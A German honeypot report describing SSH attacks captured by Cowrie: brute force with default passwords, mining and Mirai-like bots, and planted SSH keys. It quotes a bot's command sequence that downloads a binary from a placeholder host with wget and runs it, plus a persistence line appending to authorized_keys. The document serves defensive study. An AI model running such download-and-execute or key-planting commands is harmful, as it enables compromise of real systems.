# Erkenntnisse

Was der Honeypot in den ersten Wochen eingefangen hat. Die genauen Zahlen stehen im jeweils aktuellen Dashboard.

## Wie schnell kommen Angriffe

Schon wenige Minuten nachdem Port 22 öffentlich erreichbar war, kamen die ersten Login Versuche. Kein Mensch sucht gezielt, das Internet wird rund um die Uhr automatisch nach offenen Ports abgegrast.

## Beobachtete Angriffsarten

| Art | Was passiert | Erkennungsmerkmal im Log |
|---|---|---|
| Brute Force mit Standardpasswörtern | Hunderte Kombinationen wie `root:123456`, `admin:admin` | Viele `login.failed` von einer IP |
| Anbieterbezogene Wortlisten | Passwörter mit Bezug zum Hoster, weil die IP einem deutschen Rechenzentrum gehört | Passwörter mit Anbieter‑ oder Ortsnamen |
| Deutsche Wortlisten | Muster wie `Passwort#2005` von Cloud IPs | Deutschsprachige Passwörter |
| IoT Standardzugänge | Zugangsdaten von Kameras und Routern | Benutzer wie `support`, `ubnt`, `pi` |
| Automatische Prüfung | Zwei Sitzungen im Abstand von unter einer Sekunde, erst Login testen, dann `uname -a` | Sehr kurze Sitzungsdauer |
| Krypto Mining Bot | Prüft CPU, RAM und ob er in einer Sandbox läuft | Befehle wie `nproc`, `cat /proc/cpuinfo`, `free -m` |
| Mirai artige Bots | Lädt ELF Dateien für viele Architekturen (ARM, aarch64, x86, i386, RISC‑V) | `file_download` mit mehreren Varianten |
| Persistenz | Eigener SSH Schlüssel wird eingetragen | `echo ... >> ~/.ssh/authorized_keys` |
| Gestufte Payload | Datei wird Stück für Stück per `printf` geschrieben, um Download Sperren zu umgehen | Viele `printf` Befehle hintereinander |
| Scans auf AD Ports | SMB, LDAP, RDP und Kerberos werden abgeklopft | Einträge in `portfake.json` |

## Typische Befehlsfolge eines Bots

```text
uname -a
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cat /proc/cpuinfo | grep name | head -n 1
cd /tmp || cd /var/run || cd /dev/shm
wget http://<server>/x86 ; chmod +x x86 ; ./x86
```

Der Bot ermittelt zuerst die Architektur, sucht ein beschreibbares Verzeichnis, lädt die passende Malware und startet sie. In Cowrie passiert nichts davon wirklich, die Datei wird nur gespeichert.

## Lessons Learned

| Thema | Erkenntnis |
|---|---|
| CGNAT | Ohne öffentliche IP braucht es einen Umweg, ein günstiger VPS löst das sauber |
| Echte IPs | Kein Masquerading, dafür Policy Routing am Sensor |
| Keepalive | Ohne Keepalive schläft der Tunnel hinter CGNAT ein |
| Eigene Fehler | Versehentlicher Login im Honeypot zeigt, wie schnell Passwörter im Log landen |
| Ressourcen | T‑Pot ist zu groß für den Pi, Aufteilung auf VM war richtig |
| Präsentation | Live Alarm am Handy und Dashboard machen das Thema auch für Nicht‑ITler greifbar |

## Ausblick

| Idee | Nutzen |
|---|---|
| Logs an T‑Pot Elastic schicken | Alles in einem Kibana |
| Abuse Meldungen automatisieren | Hoster über angreifende Server informieren |
| Fail2ban Daten mit Honeypot verknüpfen | Blocklisten für echte Server erzeugen |
| Mehr Fake Dienste | MSSQL, WinRM, DNS für ein noch echteres AD Bild |
